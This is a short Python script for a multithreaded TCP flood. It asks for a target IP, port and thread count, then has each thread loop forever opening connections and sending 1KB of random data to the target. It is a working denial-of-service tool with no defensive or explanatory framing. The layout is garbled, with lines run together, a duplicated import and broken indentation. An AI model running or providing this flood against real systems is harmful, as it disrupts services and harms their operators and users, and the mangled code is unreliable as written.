import socket                                                    import socket                                                                           import threading
import random                                                                           
ip = input("Target IP: ")                                                               port = int(input("Target Port: "))
threads = int(input("Number of Threads: "))                                             
def tcp_flood():                                                                            data = random._urandom(1024)  # Random 1KB packet
    while True:                                                                                 try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                sock.connect((ip, port))
            sock.send(data)                                                                         print(f"Sent TCP packet to {ip}:{port}")
        except Exception as e:                                                                      print(f"Error: {e}")
                                                                                        # Launch threads
for i in range(threads):                                                                    t = threading.Thread(target=tcp_flood)
    t.daemon = True                                                                         t.start()
                                                                                        # Keep alive
while True:                                                                                 pass                       
